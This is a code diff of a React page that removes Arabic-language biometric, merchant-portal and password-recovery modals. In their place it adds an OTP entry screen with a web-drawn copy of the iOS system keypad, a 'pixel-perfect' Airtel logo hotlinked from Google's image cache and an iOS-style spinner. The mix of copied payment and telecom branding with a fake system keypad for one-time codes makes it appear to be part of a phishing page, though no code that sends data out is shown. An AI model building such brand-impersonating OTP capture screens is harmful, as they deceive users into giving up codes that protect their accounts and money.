-            </div>
-            <h3 className="text-[17px] font-bold text-gray-900 mb-1">
-              المصادقة البيومترية
-            </h3>
-            <p className="text-[13px] text-gray-500 mb-4">
-              يرجى استخدام مستشعر البصمة أو مفتاح الأمان للمتابعة
-            </p>
-            <div className="w-full bg-gray-100 rounded-full h-1.5 overflow-hidden">
-              <div className="bg-[#1E64EC] h-full animate-[mukuruFill_2s_infinite]" />
+                <svg
+                  width="15"
+                  height="15"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                </svg>
+                <span>Call</span>
+              </a>
             </div>
           </div>
-        </div>
-      )}
 
-      {/* Merchant Modal */}
-      {merchantModal && (
-        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
-          <div className="bg-white rounded-[24px] p-6 max-w-[360px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
-            <h3 className="text-[18px] font-bold text-gray-900 mb-2">
-              بوابة التجار | Merchant Portal
-            </h3>
-            <p className="text-[13px] text-gray-600 mb-5 leading-relaxed">
-              مرحباً بك في منصة التجار الخاصة بشركة وسيط باي. تتيح لك المنصة متابعة العمليات وإصدار الفواتير.
-            </p>
-            <button
-              onClick={() => setMerchantModal(false)}
-              className="w-full py-3 bg-[#1E64EC] text-white font-bold rounded-[14px] text-[14px] cursor-pointer hover:bg-[#1855ca]"
-            >
-              إغلاق
-            </button>
+          {/* iOS System Keypad */}
+          <div className="w-full bg-[#D1D5DC] pt-2 pb-4 sm:pb-6 px-1.5 border-t border-[#C0C4CC]">
+            <div className="grid grid-cols-3 gap-1.5 max-w-[420px] mx-auto">
+              {[
+                { digit: "1", letters: "" },
+                { digit: "2", letters: "ABC" },
+                { digit: "3", letters: "DEF" },
+                { digit: "4", letters: "GHI" },
+                { digit: "5", letters: "JKL" },
+                { digit: "6", letters: "MNO" },
+                { digit: "7", letters: "PQRS" },
+                { digit: "8", letters: "TUV" },
+                { digit: "9", letters: "WXYZ" },
+              ].map((item) => (
+                <button
+                  key={item.digit}
+                  type="button"
+                  onClick={() => handleOtpKeyPress(item.digit)}
+                  className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_1px_rgba(0,0,0,0.28)] h-[46px] sm:h-[50px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
+                >
+                  <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
+                    {item.digit}
+                  </span>
+                  {item.letters && (
+                    <span className="text-[9px] sm:text-[9.5px] font-bold tracking-[1.5px] text-[#000000] uppercase mt-0.5 leading-none">
+                      {item.letters}
+                    </span>
+                  )}
+                </button>
+              ))}
+
+              {/* Blank placeholder key */}
+              <div className="h-[46px] sm:h-[50px]" />
+
+              {/* Zero */}
+              <button
+                type="button"
+                onClick={() => handleOtpKeyPress("0")}
+                className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_1px_rgba(0,0,0,0.28)] h-[46px] sm:h-[50px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
+              >
+                <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
+                  0
+                </span>
+              </button>
+
+              {/* Backspace key */}
+              <button
+                type="button"
+                onClick={handleOtpBackspace}
+                aria-label="Delete"
+                className="rounded-[5px] sm:rounded-[6px] h-[46px] sm:h-[50px] flex items-center justify-center active:opacity-50 transition-opacity cursor-pointer select-none"
+              >
+                <svg
+                  width="24"
+                  height="18"
+                  viewBox="0 0 24 18"
+                  fill="none"
+                  stroke="#1C1C1E"
+                  strokeWidth="1.6"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <path d="M7 1L1 9L7 17H23V1H7Z" />
+                  <line x1="12" y1="6" x2="18" y2="12" />
+                  <line x1="18" y1="6" x2="12" y2="12" />
+                </svg>
+              </button>
+            </div>
           </div>
         </div>
       )}
+    </main>
+  )
+}
 
-      {/* Forgot Password Modal */}
-      {forgotModal && (
-        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
-          <div className="bg-white rounded-[24px] p-6 max-w-[360px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
-            <h3 className="text-[18px] font-bold text-gray-900 mb-2">
-              استعادة كلمة المرور
-            </h3>
-            <p className="text-[13px] text-gray-600 mb-5 leading-relaxed">
-              يرجى إدخال رقم هاتفك المسجل وسنرسل لك رمز التحقق لاستعادة الحساب
-            </p>
-            <button
-              onClick={() => setForgotModal(false)}
-              className="w-full py-3 bg-[#1E64EC] text-white font-bold rounded-[14px] text-[14px] cursor-pointer hover:bg-[#1855ca]"
-            >
-              موافق
-            </button>
-          </div>
-        </div>
-      )}
-      
+/* ========================================================================= */
+/* SUB-COMPONENTS & ICONS                                                    */
+/* ========================================================================= */
+
+/**
+ * Pixel-perfect Airtel brand logo matching Image 1
+ */
+function AirtelLogo() {
+  return (
+    <div className="flex items-center justify-center select-none">
+      <img
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380"
+        alt="Airtel"
+        className="h-7 w-auto object-contain"
+      />
+    </div>
+  )
+}
+
+/**
+ * Airtel Zimbabwe/Zambia custom numeric keypad backspace tag icon
+ */
+function BackspaceTagIcon() {
+  return (
+    <svg
+      width="24"
+      height="18"
+      viewBox="0 0 30 22"
+      fill="none"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M9.5 1.5L1.5 11L9.5 20.5H27C28.1046 20.5 29 19.6046 29 18.5V3.5C29 2.39543 28.1046 1.5 27 1.5H9.5Z"
+        fill="#6B7280"
+      />
+      <path
+        d="M15 7L21 15M21 7L15 15"
+        stroke="white"
+        strokeWidth="2.2"
+        strokeLinecap="round"
+      />
+    </svg>
+  )
+}
+
+/**
+ * Smooth 12-petal iOS activity indicator
+ */
+function IOSActivityIndicator() {
+  const petals = [
+    { rotate: 0, delay: "-0.916s", opacity: 0.15 },
+    { rotate: 30, delay: "-0.833s", opacity: 0.22 },
+    { rotate: 60, delay: "-0.75s", opacity: 0.3 },
+    { rotate: 90, delay: "-0.666s", opacity: 0.38 },
+    { rotate: 120, delay: "-0.583s", opacity: 0.45 },
+    { rotate: 150, delay: "-0.5s", opacity: 0.53 },
+    { rotate: 180, delay: "-0.416s", opacity: 0.6 },
+    { rotate: 210, delay: "-0.333s", opacity: 0.68 },
+    { rotate: 240, delay: "-0.25s", opacity: 0.76 },
+    { rotate: 270, delay: "-0.166s", opacity: 0.84 },
+    { rotate: 300, delay: "-0.083s", opacity: 0.92 },
+    { rotate: 330, delay: "0s", opacity: 1 },
+  ]
+
+  return (
+    <div className="relative w-10 h-10">
+      {petals.map((petal, index) => (
+        <span
+          key={index}
+          className="absolute w-[3px] h-[8px] bg-white rounded-full left-[18.5px] top-[3px] origin-[1.5px_17px] animate-[iosSpin_1s_linear_infinite]"
+          style={{
+            transform: `rotate(${petal.rotate}deg)`,
+            animationDelay: petal.delay,
+          }}
+        />
+      ))}
     </div>
   )
 }
